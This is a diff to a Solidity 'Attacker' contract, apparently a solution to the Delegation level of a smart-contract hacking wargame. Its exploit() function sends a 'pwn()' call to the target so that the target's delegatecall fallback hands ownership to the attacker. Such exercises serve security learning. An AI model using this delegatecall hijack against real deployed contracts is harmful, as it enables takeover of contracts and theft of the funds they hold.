@@ -1,16 +1,17 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity ^0.8.13;
+import "@levels/Delegation.sol";
 
 contract Attacker {
-    address public target;
+    Delegation public target;
 
     constructor(address _target) payable {
-        target = _target;
+        target = Delegation(_target);
     }
 
     receive() external payable {}
 
     function exploit() public payable {
-        target.call(abi.encodeWithSignature("pwn()"));
+        address(target).call(abi.encodeWithSignature("pwn()"));
     }
 }
